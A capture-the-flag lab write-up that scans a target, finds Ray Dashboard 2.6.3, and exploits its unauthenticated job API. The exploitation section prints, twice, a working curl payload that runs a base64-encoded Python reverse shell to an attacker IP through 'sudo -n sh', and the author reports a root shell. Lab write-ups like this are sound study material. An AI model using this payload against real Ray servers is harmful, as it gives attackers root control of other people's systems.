CTF-Labor-200-06

Target IP: 192.168.242.37
Challenge Description: Part 6 of Labor Day CTF Machine.

Reconnaissance


Performing a port scan using the command sudo nmap -sS 192.168.242.37 -p- returns the open TCP ports shown above. I did an aggressive port scan using the command sudo nmap -sV -A 192.168.242.37 -p 22,9000,33381,36565,37775,40431,43265,44217,44227,45787,52365,52436,56374,60922 and identified two important applications: SSH on port 22, and some sort of HTTP application on port 9000.

Enumeration & Exploitation

Port 9000: HTTP


The webpage above is displayed for this port. After some manual enumeration, I found the application name & version of Ray Dashboard 2.6.3 as shown above.


Doing a Google search for Ray 2.6.3 exploits led me to the website above. This website contains a bunch of PoC. I tried a few of them, but I had no luck.


I did some further research and found the website above. This website contains the PoC that can lead to unauthenticated RCE. I modified the PoC from the website above, and created the new payload:

curl -X 'POST' 'http://192.168.242.37:52365/api/job_agent/jobs/' -d '{"entrypoint":"echo cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMTkyLjE2OC40NS4yMDMiLDgwKSk7W29zLmR1cDIocy5maWxlbm8oKSxmKWZvciBmIGluKDAsMSwyKV07cHR5LnNwYXduKCIvYmluL2Jhc2giKSc=|base64$IFS-d|sudo -n sh"}'
curl -X 'POST' 'http://192.168.242.37:52365/api/job_agent/jobs/' -d '{"entrypoint":"echo cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMTkyLjE2OC40NS4yMDMiLDgwKSk7W29zLmR1cDIocy5maWxlbm8oKSxmKWZvciBmIGluKDAsMSwyKV07cHR5LnNwYXduKCIvYmluL2Jhc2giKSc=|base64$IFS-d|sudo -n sh"}'


In the image above, there are two terminals. The top terminal is where I started a listener on my machine at port 80. Then I deployed the payload on the bottom terminal. I successfully obtained a reverse shell connection with the session as user root. No need for privilege escalation either, as the exploit lands me a root shell right away.
